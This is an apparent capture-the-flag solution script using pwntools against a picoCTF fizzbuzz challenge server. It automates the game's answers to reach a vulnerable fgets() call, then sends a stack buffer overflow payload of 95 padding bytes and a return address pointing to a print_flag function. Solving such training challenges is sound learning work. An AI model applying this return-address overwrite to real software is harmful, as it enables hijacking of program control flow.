from pwn import *

# -------------------------------
# expected intro messages (if any)
# -------------------------------
messages = [
    "fizz",
    "buzz",
    "fizz",
    "fizz",
    "buzz",
    "fizz",
    "fizzbuzz",
    "fizz",
    "buzz",
    "fizz",
    "fizz",
    "buzz",
    "fizz",
    "fizzbuzz",
    "fizz",
    "buzz",
    "fizz",
    "fizz",
    "buzz",
    "fizz",
    "fizzbuzz",
    "fizz",
    "buzz",
    "fizz",
    "fizz",
    "buzz",
    "fizz",
    "fizzbuzz",
    "fizz",
    "buzz",  
    "fizz",   # here 31
]



# -------------------------------
# helpers
# -------------------------------
def answer(n: int) -> bytes:
    if n % 15 == 0:
        return b'fizzbuzz'
    if n % 3 == 0:
        return b'fizz'
    if n % 5 == 0:
        return b'buzz'

    return str(n).encode()


def get_number(p) -> int:
    return int(p.recvuntil(b'? ').decode().rstrip('? '))


def pass_function(p):
    number = get_number(p)
    p.sendline(answer(number))

    while (number := get_number(p)) != 1:
        p.sendline(answer(number))


def pass_functions(p, depth: int):
    p.sendlineafter(b'? ', b'0')

    for _ in range(depth):
        pass_function(p)
        p.sendline(b'0')

    log.info(f'Passed {depth} function' + ('s' if depth > 1 else ''))



def pass_messages(p):
    while len(messages):
        data = p.recvuntil(b'? ').decode().splitlines()

        if len(data) >= 2:
            if data[0] != messages.pop(0):
                log.error('Unexpected message')

        if len(data) == 3:
            if data[1] != messages.pop(0):
                log.error('Unexpected message')

        number = int(data[-1].rstrip('? '))

        p.sendline(answer(number))


def get_process():
    return remote("mercury.picoctf.net", 4636)
    # return process("./vuln")


# -------------------------------
# main exploit flow
# -------------------------------
def main():
    p = get_process()

    pass_messages(p)
    log.info('Passed messages')

    pass_functions(p, 8)
    pass_functions(p, 1)
    pass_functions(p, 22)

    for i in range(4):
        p.sendlineafter(b'? ', answer(i + 1))

    p.sendlineafter(b'? ', b'0')

    log.info('Arrived to vulnerable fgets()')

    offset = 95
    junk = b'A' * offset

    print_flag_addr = 0x08048656

    payload = junk + p32(print_flag_addr)

    p.sendlineafter(b'? ', b'0' + b' ' * 8 + payload)

    log.success(f'Flag: {p.recvline().decode()}')

    p.close()


# -------------------------------
if __name__ == "__main__":
    main()
